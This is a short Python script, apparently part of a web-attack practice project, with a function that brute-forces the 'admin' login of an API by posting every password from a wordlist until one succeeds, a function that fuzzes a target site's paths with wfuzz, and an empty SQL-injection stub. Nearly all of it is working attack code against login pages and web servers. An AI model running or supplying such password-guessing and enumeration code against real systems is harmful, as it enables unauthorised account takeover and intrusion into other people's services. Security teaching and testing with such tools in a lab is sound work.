import requests
import logging
import wfuzz
from consts import API_URL, STATIC_PATH, TARGET_URL


logger = logging.getLogger(__name__)
# handler = logging.FileHandler('requests.log')
# handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
# handler.setFormatter(formatter)
# logger.addHandler(handler)


def bruteforce_login(username: str = "admin") -> None:
    with open(f"{STATIC_PATH}/wordlist.txt", "r") as f:
        passwds = f.read().split('\n')

    headers = {
        "Content-Type": "application/json"
    }

    data = {
        "username": username,
        "password": "<>"
    }
    for n, passwd in enumerate(passwds):
        logger.debug(f'Trying password {n + 1}/{len(passwds)}')
        data['password'] = passwd

        r = requests.post(f'{API_URL}/login', headers=headers, json=data)

        if r.status_code == 200:
            logger.info(f'Found password for Admin: {passwd}')
            break


def fuzz_website() -> None:
    for r in wfuzz.fuzz(url=f"{TARGET_URL}/FUZZ", hc=[404], payloads=[("file", {"fn": f"{STATIC_PATH}/fuzz.txt"})]):
        logger.info(r)


def sqli() -> None:
    pass